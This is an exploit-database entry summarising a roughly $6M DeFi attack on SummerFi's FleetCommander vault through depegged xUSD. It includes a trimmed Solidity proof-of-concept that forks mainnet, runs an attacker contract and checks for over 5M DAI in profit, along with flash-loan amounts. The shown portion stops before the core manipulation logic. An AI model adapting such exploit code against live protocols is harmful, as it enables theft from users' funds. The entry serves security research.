# [?] SummerFi - FleetCommander NAV Inflation via Depegged xUSD

## Summary
Severity: Unknown
Chain: Ethereum
Component: SummerFi
Published: 2026-07-06
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-07/SummerFi_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$6M (DAI + LVUSDC shares)

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("mainnet", 25_471_347);
        fundingToken = DAI;
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "AttackContract");
        vm.label(FLEET_A, "FleetCommanderA");
        vm.label(FLEET_A_ARK, "SiloManagedVaultArk");
        vm.label(VGUSDC, "vgUSDC");
        vm.label(XUSD, "xUSD");
    }

    function testExploit() public {
        // execute at the historical attack contract so it inherits the vgUSDC it
        // pre-positioned in a prior setup tx (initial capital for this transaction)
        Exploiter impl = new Exploiter();
        vm.etch(ATTACK_CONTRACT, address(impl).code);

        uint256 before = IERC20(DAI).balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        Exploiter(ATTACK_CONTRACT).run(ATTACKER);
        uint256 profit = IERC20(DAI).balanceOf(ATTACKER) - before;

        emit log_named_decimal_uint("Attacker DAI profit", profit, 18);
        // The FleetA leg reproduced here extracts ~5.6M of the ~6.02M total loss; the
        // remaining ~0.4M came from a second FleetCommander (FleetB) leg not reproduced.
        assertGt(profit, 5_000_000e18, "profit below 5M DAI");
    }
}

contract Exploiter {
    uint256 constant FLASH_USDT = 1_000_000e6;
    uint256 constant FLASH_USDC = 65_419_171_879_990;
    uint256 constant XUSD_IN = 20_000e6; // USDT swapped for xUSD on Uniswap V4
    uint256 constant FLEET_A_DEPOSIT = 64_828_534_992_005;
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-07/SummerFi_exp.sol_
